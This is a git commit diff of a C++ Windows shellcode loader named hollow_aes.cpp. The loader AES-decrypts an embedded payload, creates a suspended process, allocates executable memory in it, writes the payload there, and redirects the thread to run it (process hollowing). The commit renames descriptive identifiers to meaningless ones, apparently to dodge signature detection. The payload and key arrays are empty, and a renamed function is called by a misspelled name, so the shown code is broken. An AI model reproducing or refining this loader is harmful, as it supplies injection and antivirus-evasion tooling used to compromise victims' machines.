ca6946469cfabf91f56b4f1b7aa50f687d0c4a18
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-31 00:12:39 -0500

    Update hollow_aes.cpp

--- dummyda/hollow_aes.cpp
+++ dummyda/hollow_aes.cpp
@@ -1,5 +1,4 @@
 
-
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
@@ -7,16 +6,16 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
+void encaeshello(char* code1299d, DWORD code1299dLen, char* k27eykk, DWORD k27eykkLen) {
     HCRYPTPROV hProv;
     HCRYPTHASH hHash;
     HCRYPTKEY hKey;
 
     CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
     CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
-    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
+    CryptHashData(hHash, (BYTE*)k27eykk, k27eykkLen, 0);
     CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
-    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen);
+    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)code1299d, &code1299dLen);
 
     CryptReleaseContext(hProv, 0);
     CryptDestroyHash(hHash);
@@ -28,8 +27,8 @@ int main() {
     Sleep(2000);
 
     
-    unsigned char AESkey[] = {};
-    unsigned char AEScode[] = {}; 
+    unsigned char ke185hams[] = {};
+    unsigned char itsthecod345[] = {}; 
 
     // Create a new process in a suspended state
     STARTUPINFO si = {0};
@@ -45,12 +44,12 @@ int main() {
 
     GetThreadContext(pi.hThread, &ctx);
 
-    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, sizeof(AEScode),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     // Decrypt the payload
-    DecryptAES((char*)  AEScode, sizeof(AEScode), AESkey, sizeof(AESkey));
+    encaeshell((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
 
     // Write payload to target process
-    WriteProcessMemory(pi.hProcess, memlo, AEScode, sizeof(AEScode), NULL);
+    WriteProcessMemory(pi.hProcess, memlo, itsthecod345, sizeof(itsthecod345), NULL);
     // Update entry point
     ctx.Rcx = (DWORD64)memlo; // Use Rcx for x64 processes
     SetThreadContext(pi.hThread, &ctx);
